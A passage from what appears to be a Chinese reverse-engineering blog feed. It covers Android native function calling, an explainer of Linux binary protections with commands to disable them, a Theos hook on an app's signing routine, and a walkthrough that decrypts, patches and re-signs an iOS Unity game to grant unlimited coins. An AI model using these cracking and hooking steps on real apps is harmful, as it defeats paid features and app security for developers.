class="keyword">void</span>* <span class="title">get_module_base</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span>* module_name)</span></span></div><div class="line">&#123;</div><div class="line">    FILE* fp;</div><div class="line">    <span class="keyword">long</span> addr = <span class="number">0</span>;</div><div class="line">    <span class="keyword">char</span> *pch;</div><div class="line">    <span class="keyword">char</span> filename[<span class="number">32</span>];</div><div class="line">    <span class="keyword">char</span> line[<span class="number">1024</span>];</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(pid &lt;= <span class="number">0</span>)&#123;</div><div class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/self/maps"</span>);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/%d/maps"</span>, pid);</div><div class="line">    &#125;</div><div class="line">    fp = fopen(filename,<span class="string">"r"</span>);</div><div class="line">    <span class="keyword">if</span>(fp != <span class="literal">NULL</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">while</span>(fgets(line, <span class="keyword">sizeof</span>(line), fp))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>(<span class="built_in">strstr</span>(line, module_name))</div><div class="line">            &#123;</div><div class="line">                pch = strtok(line, <span class="string">"-"</span>);</div><div class="line">                addr = strtoul(pch, <span class="literal">NULL</span>, <span class="number">16</span>);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        fclose(fp);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> (<span class="keyword">void</span>*)addr;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Java_com_example_hookso_JNI_testfunc</span><span class="params">(JNIEnv *env, jobject jobj)</span></span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Java_com_example_hookso_JNI_testfunc</span><span class="params">(JNIEnv *env, jobject jobj)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">string</span> str = <span class="string">"1"</span>;</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"Java_com_example_hookso_JNI_testfunc: %s\n"</span>, str.c_str());</div><div class="line">	<span class="keyword">void</span> *cs_handle = dlopen(<span class="string">"/data/local/tmp/native.so"</span>, RTLD_NOW);</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"[+] dlerror : %s"</span>, dlerror());</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"[+] cs_handle: %p"</span>, cs_handle);</div><div class="line"><span class="comment">//导出用下面这一句</span></div><div class="line"><span class="comment">//	void *cs_open_func = dlsym(cs_handle, "导出函数name");</span></div><div class="line"></div><div class="line">	<span class="keyword">u_int32_t</span> addr1 = (<span class="keyword">u_int32_t</span>)get_module_base(<span class="number">0</span>, <span class="string">"ntiave.so"</span>);</div><div class="line">	<span class="comment">//arm指令不加1 0，thumb指令加1 1</span></div><div class="line">	addr1 += <span class="number">0x0000ABD4</span>;</div><div class="line">	<span class="keyword">common_func_t</span> func = (<span class="keyword">common_func_t</span>)addr1;</div><div class="line"></div><div class="line">	jstring key = env-&gt;NewStringUTF(<span class="string">"1"</span>);</div><div class="line"><span class="comment">//	jstring str = env-&gt;NewStringUTF("qazwsxedcrfvtgbh64as65d465wq6d54a6s54d98aw4d65a4sd64qw6f46a4s9fd8d");</span></div><div class="line"></div><div class="line">	jstring ret1 = (jstring)func((<span class="keyword">u_int32_t</span>)env, <span class="number">0</span>, (<span class="keyword">u_int32_t</span>)key, <span class="number">0</span>);</div><div class="line"><span class="comment">//	jstring ret1 = (jstring)func((u_int32_t)env, 0, 0, 0);</span></div><div class="line"></div><div class="line">	LOGD(ANDROID_LOG_DEBUG, <span class="string">"[+] test_jstr: %s, size: %d"</span>, env-&gt;GetStringUTFChars((jstring)ret1, <span class="literal">false</span>), env-&gt;GetStringUTFLength((jstring)ret1));</div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Tools</tag>
        <tag>eclipse</tag>
      </tags>
  </entry>
  <entry>
    <title>checksec及其包含的保护机制</title>
    <url>/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>今天在研究liunx下栈溢出的时候发现自己对各种保护机制并不是特别了解，因此就这方面的知识在网上查找了一些资料并总结了一些心得和大家分享。<br><a id="more"></a><br>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR（Linux下对应PIE）等机制，例如存在DEP（NX）的话就不能直接执行栈上的数据，存在ASLR的话各个系统调用的地址就是随机化的。</p>
<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p>checksec是一个脚本软件，也就是用脚本写的一个文件，不到2000行，可用来学习shell。 </p>
<p>源码参见 </p>
<p><a href="http://www.trapkit.de/tools/checksec.html" target="_blank" rel="external">http://www.trapkit.de/tools/checksec.html</a></p>
<p><a href="https://github.com/slimm609/checksec.sh/" target="_blank" rel="external">https://github.com/slimm609/checksec.sh/</a></p>
<p>下载方法之一为 </p>
<p>wget <a href="https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz" target="_blank" rel="external">https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz</a></p>
<p>checksec到底是用来干什么的？ </p>
<p>它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。</p>
<p>checksec的使用方法：<br><img src="http://img.blog.csdn.net/20160920223340302" alt=""></p>
<p>checksec –file /usr/sbin/sshd<br><img src="http://img.blog.csdn.net/20160920235408000" alt=""></p>
<p>一般来说，如果是学习二进制漏洞利用的朋友，建议大家使用gdb里peda插件里自带的checksec功能，如下：</p>
<pre><code>gdb-peda$ checksec start
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
</code></pre><p>下面我们就图中各个保护机制进行一个大致的了解。</p>
<h2 id="CANNARY-栈保护"><a href="#CANNARY-栈保护" class="headerlink" title="CANNARY(栈保护)"></a>CANNARY(栈保护)</h2><p>这个选项表示栈保护功能有没有开启。</p>
<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
<p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。</p>
<p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p>
<pre><code>gcc -fno-stack-protector -o test test.c  //禁用栈保护
gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码
gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码
</code></pre><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>这个保护机制查了很久都没有个很好的汉语形容，根据我的理解它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。</p>
<p>举个例子可能简单明了一些：<br>一段简单的存在缓冲区溢出的C代码</p>
<pre><code>void fun(char *s) {
        char buf[0x100];
        strcpy(buf, s);
        /* Don&apos;t allow gcc to optimise away the buf */
        asm volatile(&quot;&quot; :: &quot;m&quot; (buf));
}
</code></pre><p>用包含参数-U_FORTIFY_SOURCE编译</p>
<pre><code>08048450 &lt;fun&gt;:
  push   %ebp               ; 
  mov    %esp,%ebp

  sub    $0x118,%esp        ; 将0x118存储到栈上
  mov    0x8(%ebp),%eax     ; 将目标参数载入eax
  mov    %eax,0x4(%esp)     ; 保存目标参数
  lea    -0x108(%ebp),%eax  ; 数组buf
  mov    %eax,(%esp)        ; 保存
  call   8048320 &lt;strcpy@plt&gt;

  leave                     ; 
  ret
</code></pre><p>用包含参数-D_FORTIFY_SOURCE=2编译</p>
<pre><code>08048470 &lt;fun&gt;:
  push   %ebp               ; 
  mov    %esp,%ebp

  sub    $0x118,%esp        ; 
  movl   $0x100,0x8(%esp)   ; 把0x100当作目标参数保存
  mov    0x8(%ebp),%eax     ; 
  mov    %eax,0x4(%esp)     ; 
  lea    -0x108(%ebp),%eax  ; 
  mov    %eax,(%esp)        ; 
  call   8048370 &lt;__strcpy_chk@plt&gt;

  leave                      ; 
  ret
</code></pre><p>我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p>
<h2 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h2><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
<p>工作原理如图：<br><img src="http://space.itpub.net/attachments/2011/07/13164110_201107181702402.jpg?_=2109736" alt=""><br>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br>例如：</p>
<pre><code>gcc -z execstack -o test test.c
</code></pre><p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p>
<h2 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h2><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p>
<p>内存地址随机化机制（address space layout randomization)，有以下三种情况</p>
<pre><code>0 - 表示关闭进程地址空间随机化。
1 - 表示将mmap的基址，stack和vdso页面随机化。
2 - 表示在1的基础上增加栈（heap）的随机化。
</code></pre><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>
<p>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p>
<p>liunx下关闭PIE的命令如下：</p>
<pre><code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space
</code></pre><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。</p>
]]></content>
      <tags>
        <tag>liunx</tag>
      </tags>
  </entry>
  <entry>
    <title>iOS Theos的一些心得</title>
    <url>/2020/06/02/iOS-Theos%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[<p>之前在iOS逆向过程中，并不常用Hook方式去协助逆向，偶尔有用也是通过frida去定位打印一些固定算法的参数和结果。在iOS逆向领域，最基础的Hook方式或者说工具就要说到Theos了，本篇主要分享记录一下我在使用Theos Hook阿里系X-sign的一些心得。</p>
<a id="more"></a>
<h1 id="Theos简介"><a href="#Theos简介" class="headerlink" title="Theos简介"></a>Theos简介</h1><p>Theos是一款跨平台的越狱开发工具包，可以在Win、Linux、MacOS等平台下工作。由于Theos实现了对Cydia Substrace的封装，因而能实现对Objective-C运行时的Hook，也能实现对C语言函数的Hook。iOS平台下的Hook插件主要依赖于Theos中的Tweak插件，实质就是iOS平台的动态库（dylib），利用Cydia Substrace提供的组件进行加载。<br>至于如何安装Theos以及创建工程这里就不在一一叙述了，网上可以查到的资料实在太多。</p>
<h1 id="Tweak-xm编写"><a href="#Tweak-xm编写" class="headerlink" title="Tweak.xm编写"></a>Tweak.xm编写</h1><p>“.xm”后缀表示源文件支持Logos和C/C++语法，如果是”.x”后缀，说明源文件仅支持Logos和C语法。<br>我们的Hook代码都写在该文件当中。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="comment">//将要Hook的类写在%hook之后</span></div><div class="line">%hook SecurityGuardOpenUnifiedSecurity</div><div class="line"><span class="comment">// 需要Hook的类和函数写在下面</span></div><div class="line">- (id)getSign:(id)arg1 data:(id)arg2 env:(<span class="keyword">int</span>)arg3 api:(id)arg4&#123;</div><div class="line"><span class="comment">//Log打印参数和结果</span></div><div class="line">NSLog(@<span class="string">"-------------Hooked-------------"</span>);</div><div class="line">NSLog(@<span class="string">"----arg1:%@ arg2:%@ arg3:%d arg4:%@-------------"</span>, arg1, arg2, arg3, arg4);</div><div class="line"><span class="comment">//%orig执行原函数逻辑,也可以修改传入参数</span></div><div class="line">id result = %orig;</div><div class="line">NSLog(@<span class="string">"-------result:%@--------"</span>, result);</div><div class="line">NSLog(@<span class="string">"dddddddddddd"</span>);</div><div class="line"><span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line"></div><div class="line">%end</div></pre></td></tr></table></figure>
<p>这里不得不提一下class-dump还是很有用的，通过该工具dump出来的类和函数用于辅助Tweak插件编写太方便了，参数个数、类型以及返回值类型一目了然。</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Tweak.jpg" alt=""></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本篇主要简单记录一下自己Tweak Hook过程，相当于留个笔记，并没有太多的技术在内，后续有其他Tweak用法会加进去。</p>
]]></content>
      <tags>
        <tag>Hook</tag>
        <tag>iOS</tag>
      </tags>
  </entry>
  <entry>
    <title>Unity3D游戏修改&amp;iOS免越狱hook</title>
    <url>/2020/06/04/iOS%E5%85%8D%E8%B6%8A%E7%8B%B1hook&amp;Unity3D%E6%B8%B8%E6%88%8F%E4%BF%AE%E6%94%B9/</url>
    <content><![CDATA[<p>所谓免越狱Hook就是在iOS设备未进行越狱操作的前提下，对APP进行Hook操作，很久之前就有听说过，昨天花了一天时间整环境外加测试，然后又顺带修改了一个比较让人烦恼的游戏，Unity3D破解其实很早就搞过了，这次借着免越狱Hook一起分享给大家。</p>
<a id="more"></a>
<h1 id="工欲善其事必先利其器"><a href="#工欲善其事必先利其器" class="headerlink" title="工欲善其事必先利其器"></a>工欲善其事必先利其器</h1><ul>
<li>越狱iPhone(必须)<br>虽然最终修改之后的APP是要装到非越狱的iPhone上，但是APP需要砸壳，外加PP助手下架之后没啥好地方下载砸壳之后的ipa了，因此必须要有一部越狱的iPhone。</li>
<li>未越狱iPhone<br>这个不用说了，目标APP安装</li>
<li>MonKeyDev<br>AloneMonkey大佬的作品，Hook插件编写神器，大佬还在其中集成了iOSOpenDev，同时也是非越狱插件开发集成的神器。<a href="https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85" target="_blank" rel="external">官方安装指南</a></li>
<li>frida-ios-dump<br>AloneMonkey大佬的又一力作，砸壳神器，iOS逆向一年多了，目前为止无往不利<br>iOS frida安装 <a href="https://frida.re/docs/ios/" target="_blank" rel="external">官方安装指南</a><br>frida-ios-dump使用 <a href="https://frida.re/docs/ios/" target="_blank" rel="external">项目地址</a></li>
<li>IDA<br>分析砸壳后的APP，导入符号表python脚本方便分析</li>
<li>Il2CppDumper<br><a href="https://github.com/Perfare/Il2CppDumper" target="_blank" rel="external">项目地址</a><br>Unity3D游戏分析利器，Unity转换成IL2CPP的符号表提取工具，目前只支持Windows平台，最终生成的符号表脚本导入IDA用</li>
<li>IPAPatch<br><a href="https://github.com/Naituw/IPAPatch" target="_blank" rel="external">项目地址</a><br>用于重新打包签名ipa并安装到非越狱iPhone上，非常强大。如果不想写Hook插件，也可以采取修改汇编的方式重新打包安装ipa</li>
<li>汇编码转换器<br><a href="http://www.pc6.com/softview/SoftView_594816.html" target="_blank" rel="external">下载地址</a><br>各种类型汇编代码生成机器码的工具，方便静态修改可执行文件，重打包签名安装</li>
</ul>
<h1 id="抽丝剥茧"><a href="#抽丝剥茧" class="headerlink" title="抽丝剥茧"></a>抽丝剥茧</h1><p>如果上诉工具全都准备齐全，那么就就可以开始逆向工作了，作为一个侦探密，平时喜欢玩一些密室游戏，今天修改的这款游戏叫做密室逃脱绝境系列–游乐园，不得不说情节设计的很不错，在一次尝试使用提示功能时，突然发现需要金币，然而免费金币需要看广告，每次只给一枚，但是提示的话费确实逐渐增长的，感觉有被冒犯到，所以有了接下来的一切。</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook3.jpg" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook4.jpg" alt=""></p>
<h2 id="砸壳"><a href="#砸壳" class="headerlink" title="砸壳"></a>砸壳</h2><p>首先我们需要砸壳后的ipa进行分析，定位到底需要修改什么。</p>
<p>端口转发</p>
<pre><code>iproxy 2222 22
</code></pre><p>首先通过frida查找要砸壳的APP进程</p>
<pre><code>Mac-mini:frida-ios-dump-master-2 $ frida-ps -U
 PID  Name
----  -------------------------------------------------
2911  App Store
2947  信息
2980  密室逃脱绝境系列11游乐园
2936  微信
2972  设置
2949  邮件
2814  AppleIDAuthAgent
1412  AssetCacheLocatorService
</code></pre><p>接着运行dump.py即可脱壳</p>
<pre><code>Mac-mini:frida-ios-dump-master-2 $ python2 dump.py 密室逃脱绝境系列11游乐园
Start the target app 密室逃脱绝境系列11游乐园
Dumping 密室逃脱绝境系列11游乐园 to /var/folders/m7/g2v2sbfd19g9kg7sk20n639h0000gn/T
start dump /var/containers/Bundle/Application/617F2079-957E-4005-92B8-7573FE651A8E/app1.app/app1
app1.fid: 100%|███████████████████████████████████████████████████████████████| 35.7M/35.7M [00:07&lt;00:00, 5.03MB/s]
InfoPlist.strings: 213MB [00:44, 4.97MB/s]                                                                         
0.00B [00:00, ?B/s]Generating &quot;密室逃脱绝境系列11游乐园.ipa&quot;
</code></pre><h2 id="Unity3D符号表恢复"><a href="#Unity3D符号表恢复" class="headerlink" title="Unity3D符号表恢复"></a>Unity3D符号表恢复</h2><p>在做这一步操作之前，机智的人已经将可执行文件脱到IDA文件中开始分析了，APP脱壳后解压ipa，然后查看app1包内容，主程序可执行文件使我们首要分析目标，一般来说是整个包中最大的那个文件。</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook5.jpg" alt=""></p>
<p>在IDA分析的过程中，我们刚好通过Il2CppDumper来提取符号表，提取符号表需要两个文件，一个是上述的主程序可执行文件，另一个则是符号表文件global-metadata.dat，iOS下该文件位于xxx.app/Data/Managed/Metadata目录下</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook6.jpg" alt=""></p>
<p>先后选择两个文件之后，程序跳出需要输入Unity version</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook7.png" alt=""></p>
<p>我们怎么确认到底是用了什么版本的Unity呢，只要在IDA里搜索字符串X-Unity-Version即可，调用的地方会出现版本号，我们要找的版本号即2018.4.3f1</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook8.png" alt=""></p>
<p>在输入版本号之后，选择3即可</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook9.png" alt=""></p>
<p>同时在Il2CppDumper的目录下，会生成dump.cs和script.py两个文件</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook10.png" alt=""></p>
<p>将script.py导入IDA，File——&gt;Script File——&gt;选择script.py<br>该脚本的主要作用是辅助IDA识别IL2CPP表函数名，在加载脚本之前IDA识别的函数形如sub_xxxxxxx</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook11.png" alt=""></p>
<p>加载脚本之后对函数进行了标记形成格式如类名$$函数名这样的函数</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook12.png" alt=""></p>
<h2 id="定位修改点"><a href="#定位修改点" class="headerlink" title="定位修改点"></a>定位修改点</h2><p>在将script.py导入IDA之后，我们立刻着手分析dump.cs这个文件，该文件里面解析了游戏相关的属性和函数。可以用C#工具打开，我这里直接用source打开分析。</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook13.png" alt=""></p>
<p>与其说是分析，不如说是查找更为准确一些，我们想要修改的最终目的肯定是拥有永远花不完的金币，那么我们就去针对金币去搜索定位，我搜索了Gold，定位到有一个函数为get_Gold较为可疑</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook16.png" alt=""></p>
<p>在IDA定位到函数地址</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook15.png" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook14.png" alt=""></p>
<p>之后通过lldb下断点调试，发现在打开提示的时候触发了断点，运气不错，返回上层调用查看结果为0，之后去看了个两个视频获得了两个金币之后，返回值果然变成了2，可疑确定程序就是通过这个函数来获取金币的数量。</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook17.jpg" alt=""></p>
<h1 id="直捣黄龙"><a href="#直捣黄龙" class="headerlink" title="直捣黄龙"></a>直捣黄龙</h1><p>分析定位修改点之后，就可以对游戏进行修改了，原本是想通过免越狱Hook实现对游戏的修改，但是尝试了多次一直hook不成功，多次查找发现未越狱iOS并不支持MSHookFunction方式进行hook，同时没法对形如sub_xxxxx函数进行inlinehook。<br>这里介绍两种修改方式，一种是通过iOS越狱Hook来实现对关键函数的Hook修改，主要依赖于MonkeyDev，游戏修改了之后肯定不会天天抱着一个越狱手机来玩，所以这里准备的另一种种修改方式是针对未越狱手机的，通过直接修改汇编，重打包签名ipa安装到手机上，主要依赖于IPAPatch</p>
<h2 id="iOS越狱修改"><a href="#iOS越狱修改" class="headerlink" title="iOS越狱修改"></a>iOS越狱修改</h2><p>iOS越狱插件的编写这里采用MonKeyDev，如何使用可见<a href="https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8" target="_blank" rel="external">官方文档</a></p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li>在hook不同APP时将Tweak的plist中Bundles修改应用对应的Bundleid</li>
<li>在Build Settings——&gt;User-Defined新建项CODE_SIGNING_ALLOWED，赋值为NO，否则编译会报错</li>
<li>File——&gt;Project Setting将Build System修改为Legacy Build System否则编译报错</li>
<li>切记安装sshpass</li>
</ul>
<h3 id="插件编写"><a href="#插件编写" class="headerlink" title="插件编写"></a>插件编写</h3><p>MonKeyDev支持多种Hook框架，我这里使用Tweak插件。<br>具体hook代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;substrate.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;mach-o/dyld.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">// 用于保存原函数指针</span></div><div class="line"><span class="keyword">int</span> (*old_get_Gold)();</div><div class="line"></div><div class="line"><span class="comment">// 新函数</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">new_get_Gold</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> <span class="number">9999</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">%ctor&#123;</div><div class="line"><span class="comment">// 执行hook</span></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> Gold = <span class="number">_</span>dyld_get_image_vmaddr_slide(<span class="number">0</span>) + <span class="number">0x1011aa060</span>;</div><div class="line">MSHookFunction((<span class="keyword">void</span> *)Gold, (<span class="keyword">void</span> *)&amp;new_get_Gold, (<span class="keyword">void</span> **)&amp;old_get_Gold);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="iOS未越狱修改"><a href="#iOS未越狱修改" class="headerlink" title="iOS未越狱修改"></a>iOS未越狱修改</h2><h3 id="修改汇编"><a href="#修改汇编" class="headerlink" title="修改汇编"></a>修改汇编</h3><p>首先查看get_Gold函数返回位置汇编，返回时传入X1进行经过函数转换为int返回，那么可以将9999传入X0，然后直接ret即可</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook21.png" alt=""></p>
<p>通过汇编指令生成工具生成我们需要的机器码</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook22.png" alt=""></p>
<p>ret的机器码为C0 03 5F D6 </p>
<p>最后修改对应地址的机器码即可</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook25.png" alt=""></p>
<h3 id="重打包签名"><a href="#重打包签名" class="headerlink" title="重打包签名"></a>重打包签名</h3><p>将修改后的app1可执行文件重新放回原处，将解压后的ipa包重新压缩，最终改名为app.ipa,将该文件放到IPAPatch的Assets目录下，替换掉原本的app.ipa文件。</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook23.jpg" alt=""></p>
<p>最终安装到未越狱手机上效果如下</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook24.jpg" alt=""></p>
<h1 id="隔山打牛"><a href="#隔山打牛" class="headerlink" title="隔山打牛"></a>隔山打牛</h1><p>iOS免越狱hook主要是通过iosOpenDev生成dylib注入目标APP实现Hook，iosOpenDev是apple官方支持的插件生成工具，可直接由Xcode生成。可生成CaptainHookTweak、Logos Tweak两种dylib。在注入dylib之后对APP进行重打包签名。</p>
<p>我们接下来用到的MonKeyDev是对原有iOSOpenDev的升级，更加方便于非越狱插件的编写。</p>
<h3 id="新建项目-amp-编译"><a href="#新建项目-amp-编译" class="headerlink" title="新建项目&amp;编译"></a>新建项目&amp;编译</h3><p>MonKeyDev安装完成之后，打开Xcode新建项目，滑动到最下方可以看到MonKeyDev提供的模块，选择第一个。</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook18.jpg" alt=""></p>
<p>新建之后需要配置General——&gt;Signing，设置自己的AppleID后续用于签名。</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook19.jpg" alt=""></p>
<p>接下来将砸壳后的ipa或ipa解压后的xxx.app放入Your_P<br>roject/TargetApp目录下，编译整个项目，最终安装到未越狱手机上信任之后正常运行表明签名成功。</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook20.jpg" alt=""></p>
<h3 id="寻找注入点Hook"><a href="#寻找注入点Hook" class="headerlink" title="寻找注入点Hook"></a>寻找注入点Hook</h3><p>虽然最终没能成功实现免越狱hook修改游戏，但是我们还是拿它下手</p>
<p>首先通过Class-dump将头文件dump下来，在其中寻找一个又代表性的函数进行Hook，最终决定hook UnityAppController这个类中的init函数，在他调用的时候弹出弹框。</p>
<p>在your_projectDylib.xm中Hook代码如下:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;substrate.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;sys/sysctl.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;UIKit/UIKit.h&gt;</span></span></div><div class="line"></div><div class="line">%hook UnityAppController</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Hooking an instance method with an argument.</span></div><div class="line">- (<span class="keyword">void</span>)init&#123;</div><div class="line">%orig;</div><div class="line"></div><div class="line">UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@<span class="string">"Hook成功"</span> message:nil delegate:self cancelButtonTitle:@<span class="string">"OK"</span> otherButtonTitles:nil];</div><div class="line">[alert show];</div><div class="line"><span class="comment">//[alert release];</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">%end</div></pre></td></tr></table></figure>
<p>运行程序将ipa装到未越狱手机上，游戏打开之后会有弹框出现</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook26.jpg" alt=""></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本来准备写一篇免越狱Hook结合Unity3D游戏修改为一体的文章，但是但是在Hook c函数的过程中遇到了难题，目前还没有找到未越狱手机上inlinhook的好方案，只能将两者分开来写，之后找到好的方案之后再进行修改为大家分享。</p>
<p>下面附上本人iOS Unity3D入门看的一篇文章，本文大致参考了这位大佬的框架。<a href="https://www.ichenxiaoyu.com/archero/#%E5%B7%A5%E5%85%B7" target="_blank" rel="external">iOS上的Unity逆向与弓箭传说游戏修改</a></p>
]]></content>
      <tags>
        <tag>Hook</tag>
        <tag>iOS</tag>
        <tag>Unity3D</tag>
      </tags>
  </entry>
  <entry>
    <title>lldb+python让调试更简单</title>
    <url>/2020/05/29/lldb-python%E8%AE%A9%E8%B0%83%E8%AF%95%E6%9B%B4%E7%AE%80%E5%8D%95/</url>
